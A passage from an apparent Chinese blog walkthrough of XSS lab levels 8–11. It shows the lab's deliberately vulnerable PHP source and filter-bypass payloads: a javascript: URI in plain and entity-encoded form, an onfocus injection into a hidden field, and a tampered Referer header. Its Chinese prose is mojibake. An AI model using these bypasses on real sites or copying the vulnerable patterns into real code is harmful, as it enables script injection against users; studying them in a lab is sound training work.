class=\"token punctuation\">&lt;/</span>title</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>head</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>body</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>h1</span> <span class=\"token attr-name\">align</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span>center</span><span class=\"token punctuation\">></span></span>æ¬¢è¿æ¥åˆ°level8<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>h1</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> </pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token function\">ini_set</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"display_errors\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token variable\">$str</span> <span class=\"token operator\">=</span> <span class=\"token function\">strtolower</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"keyword\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token variable\">$str2</span><span class=\"token operator\">=</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"script\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"scr_ipt\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$str</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token variable\">$str3</span><span class=\"token operator\">=</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"on\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"o_n\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$str2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token variable\">$str4</span><span class=\"token operator\">=</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"src\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"sr_c\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$str3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token variable\">$str5</span><span class=\"token operator\">=</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"data\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"da_ta\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$str4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token variable\">$str6</span><span class=\"token operator\">=</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"href\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"hr_ef\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$str5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token variable\">$str7</span><span class=\"token operator\">=</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'\"'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'&amp;quot'</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$str6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'&lt;center></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>&lt;form action=level8.php method=GET></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>&lt;input name=keyword  value=\"'</span><span class=\"token operator\">.</span><span class=\"token function\">htmlspecialchars</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$str</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'\"></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>&lt;input type=submit name=submit value=æ·»åŠ å‹æƒ…é“¾æ¥ /></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>&lt;/form></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>&lt;/center>'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre> <span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'&lt;center>&lt;BR>&lt;a href=\"'</span><span class=\"token operator\">.</span><span class=\"token variable\">$str7</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'\">å‹æƒ…é“¾æ¥&lt;/a>&lt;/center>'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>center</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>img</span> <span class=\"token attr-name\">src</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span>level8.jpg</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>center</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> </pre></td></tr><tr><td data-num=\"36\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;h3 align=center>payloadçš„é•¿åº¦:\"</span><span class=\"token operator\">.</span><span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$str7</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"&lt;/h3>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>body</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>html</span><span class=\"token punctuation\">></span></span></pre></td></tr></table></figure><p><code>strtoloweræŠŠå­—ç¬¦ä¸²è½¬æ¢ä¸ºå°å†™</code></p>\n<p><code>$str = strtolower($_GET[&quot;keyword&quot;]);</code></p>\n<p><code>$str2=str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);</code></p>\n<p><code>$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);</code></p>\n<p><code>$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);</code></p>\n<p><code>$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);</code></p>\n<p><code>$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);</code></p>\n<p><code>$str7=str_replace('&quot;','&amp;quot',$str6);</code></p>\n<p><code>è¢«æ›¿æ¢.htmlspecialchars($str)è½¬ä¹‰</code></p>\n<h4 id=\"ç¬¬ä¹å…³\"><a class=\"markdownIt-Anchor\" href=\"#ç¬¬ä¹å…³\">#</a> <span class=\"label\">ç¬¬ä¹å…³</span></h4>\n<p>è¾“å…¥ä¸Šå…³çš„æ˜¾ç¤ºé“¾æ¥ä¸åˆæ³•</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/xss/25.png\" alt=\"\"></p>\n<p>è¾“å…¥ä¸€ä¸ªé“¾æ¥</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/xss/26.png\" alt=\"\"></p>\n<p>è¿˜æ˜¯ä¸åˆæ³•æ˜¾ç¤º</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/xss/27.png\" alt=\"\"></p>\n<p><code>åŠ ä¸Šhttp://gyzero.shopæˆåŠŸè·³è½¬ï¼Œé‚£å°±æ˜¯æ£€æµ‹äº†æœ‰æ²¡æœ‰http://æ²¡æœ‰å°±æŠ¥é”™</code></p>\n<p><code>åœ¨ä¸Šä¸€å…³åŸºç¡€ä¸Šæ·»åŠ http://</code></p>\n<p><code>javascript:alert(1);//http:// å¹¶ä¸”ç”¨//æŠŠhttp://æ³¨é‡Šæ‰</code></p>\n<p><code>&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&amp;#59;//http://</code></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/xss/28.png\" alt=\"\"></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/xss/29.png\" alt=\"\"></p>\n<p>æˆåŠŸå¼¹çª—</p>\n<p><span class=\"label\">ğŸ‘ä»£ç åˆ†æ</span></p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token doctype\"><span class=\"token punctuation\">&lt;!</span><span class=\"token doctype-tag\">DOCTYPE</span> <span class=\"token name\">html</span><span class=\"token punctuation\">></span></span><span class=\"token comment\">&lt;!--STATUS OK--></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>html</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>head</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>meta</span> <span class=\"token attr-name\">http-equiv</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>content-type<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">content</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>text/html;charset=utf-8<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span><span class=\"token punctuation\">></span></span><span class=\"token script\"><span class=\"token language-javascript\"></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>window<span class=\"token punctuation\">.</span><span class=\"token function-variable function\">alert</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>  </pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#123;</span>     </pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token function\">confirm</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"å®Œæˆçš„ä¸é”™ï¼\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre> window<span class=\"token punctuation\">.</span>location<span class=\"token punctuation\">.</span>href<span class=\"token operator\">=</span><span class=\"token string\">\"level10.php?keyword=well done!\"</span><span class=\"token punctuation\">;</span> </pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>title</span><span class=\"token punctuation\">></span></span>æ¬¢è¿æ¥åˆ°level9<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>title</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>head</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>body</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>h1</span> <span class=\"token attr-name\">align</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span>center</span><span class=\"token punctuation\">></span></span>æ¬¢è¿æ¥åˆ°level9<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>h1</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> </pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token function\">ini_set</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"display_errors\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token variable\">$str</span> <span class=\"token operator\">=</span> <span class=\"token function\">strtolower</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"keyword\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token variable\">$str2</span><span class=\"token operator\">=</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"script\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"scr_ipt\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$str</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token variable\">$str3</span><span class=\"token operator\">=</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"on\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"o_n\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$str2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token variable\">$str4</span><span class=\"token operator\">=</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"src\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"sr_c\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$str3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token variable\">$str5</span><span class=\"token operator\">=</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"data\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"da_ta\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$str4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token variable\">$str6</span><span class=\"token operator\">=</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"href\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"hr_ef\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$str5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token variable\">$str7</span><span class=\"token operator\">=</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'\"'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'&amp;quot'</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$str6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'&lt;center></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>&lt;form action=level9.php method=GET></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>&lt;input name=keyword  value=\"'</span><span class=\"token operator\">.</span><span class=\"token function\">htmlspecialchars</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$str</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'\"></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>&lt;input type=submit name=submit value=æ·»åŠ å‹æƒ…é“¾æ¥ /></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>&lt;/form></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>&lt;/center>'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token constant boolean\">false</span><span class=\"token operator\">===</span><span class=\"token function\">strpos</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$str7</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'http://'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>  <span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'&lt;center>&lt;BR>&lt;a href=\"æ‚¨çš„é“¾æ¥ä¸åˆæ³•ï¼Ÿæœ‰æ²¡æœ‰ï¼\">å‹æƒ…é“¾æ¥&lt;/a>&lt;/center>'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre><span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>  <span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'&lt;center>&lt;BR>&lt;a href=\"'</span><span class=\"token operator\">.</span><span class=\"token variable\">$str7</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'\">å‹æƒ…é“¾æ¥&lt;/a>&lt;/center>'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>center</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>img</span> <span class=\"token attr-name\">src</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span>level9.png</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>center</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> </pre></td></tr><tr><td data-num=\"43\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;h3 align=center>payloadçš„é•¿åº¦:\"</span><span class=\"token operator\">.</span><span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$str7</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"&lt;/h3>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>body</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>html</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre></pre></td></tr><tr><td data-num=\"48\"></td><td><pre></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>å¢åŠ äº†ä¸€ä¸ªåˆ¤æ–­å¦‚æœstr7å«æœ‰http://åˆ™æ·»åŠ æˆåŠŸå¦‚æœæ²¡æœ‰åˆ™æŠ¥é”™æ‚¨çš„é“¾æ¥ä¸åˆæ³•ï¼Ÿæœ‰æ²¡æœ‰ï¼</pre></td></tr><tr><td data-num=\"50\"></td><td><pre>if(false===strpos($str7,'http://'))</pre></td></tr><tr><td data-num=\"51\"></td><td><pre>&#123;</pre></td></tr><tr><td data-num=\"52\"></td><td><pre>  echo '<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>center</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>BR</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>a</span> <span class=\"token attr-name\">href</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>æ‚¨çš„é“¾æ¥ä¸åˆæ³•ï¼Ÿæœ‰æ²¡æœ‰ï¼<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>å‹æƒ…é“¾æ¥<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>a</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>center</span><span class=\"token punctuation\">></span></span>';</pre></td></tr><tr><td data-num=\"53\"></td><td><pre>        &#125;</pre></td></tr><tr><td data-num=\"54\"></td><td><pre>else</pre></td></tr><tr><td data-num=\"55\"></td><td><pre>&#123;</pre></td></tr><tr><td data-num=\"56\"></td><td><pre>  echo '<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>center</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>BR</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>a</span> <span class=\"token attr-name\">href</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span><span class=\"token punctuation\">'</span>.$str7.'<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>å‹æƒ…é“¾æ¥<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>a</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>center</span><span class=\"token punctuation\">></span></span>';</pre></td></tr><tr><td data-num=\"57\"></td><td><pre>&#125;</pre></td></tr></table></figure><h4 id=\"ç¬¬ä¹å…³-2\"><a class=\"markdownIt-Anchor\" href=\"#ç¬¬ä¹å…³-2\">#</a> <span class=\"label\">ç¬¬ä¹å…³</span></h4>\n<p>è¾“å…¥â€™&quot;&lt;&gt;script javascript åªæœ‰ &lt;&gt; è¢«è¿‡æ»¤äº†</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/xss/30.png\" alt=\"\"></p>\n<p>ä¸‰ä¸ªéšè—åŸŸ</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/xss/31.png\" alt=\"\"></p>\n<p>æ·»åŠ å‚æ•°</p>\n<p>t_sort è¾“å…¥çš„è¢«ä¼ å›å‰ç«¯</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/xss/32.png\" alt=\"\"></p>\n<p>&amp;t_sort=&quot; type=â€œtextâ€ autofocus onfocus=alert(1)//</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/xss/33.png\" alt=\"\"></p>\n<h4 id=\"ç¬¬åä¸€å…³\"><a class=\"markdownIt-Anchor\" href=\"#ç¬¬åä¸€å…³\">#</a> <span class=\"label\">ç¬¬åä¸€å…³</span></h4>\n<p>å¤šäº†ä¸€ä¸ª</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/xss/34.png\" alt=\"\"></p>\n<p>t_ref  è·å– http referer</p>\n<p>æ›´æ”¹ referer</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/xss/35.png\" alt=\"\"></p>\n<p>æˆåŠŸå¼¹çª—</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/xss/36.png\" alt=\"\"></p>\n<p><span class=\"label\">ğŸ‘ä»£ç åˆ†æ</span></p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token doctype\"><span class=\"token punctuation\">&lt;!</span><span class=\"token doctype-tag\">DOCTYPE</span> <span class=\"token name\">html</span><span class=\"token punctuation\">></span></span><span class=\"token comment\">&lt;!--STATUS OK--></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>html</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>head</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>meta</span> <span class=\"token attr-name\">http-equiv</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>content-type<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">content</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>text/html;charset=utf-8<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span><span class=\"token punctuation\">></span></span><span class=\"token script\"><span class=\"token language-javascript\"></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>window<span class=\"token punctuation\">.</span><span class=\"token function-variable function\">alert</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>  </pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#123;</span>     </pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token function\">confirm</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"å®Œæˆçš„ä¸é”™ï¼\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre> window<span class=\"token punctuation\">.</span>location<span class=\"token punctuation\">.</span>href<span class=\"token operator\">=</span><span class=\"token string\">\"level12.php?keyword=good job!\"</span><span class=\"token punctuation\">;</span> </pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>title</span><span class=\"token punctuation\">></span></span>æ¬¢è¿æ¥åˆ°level11<span class=\"token tag\"><span class=\"token tag\"><span class=\"token 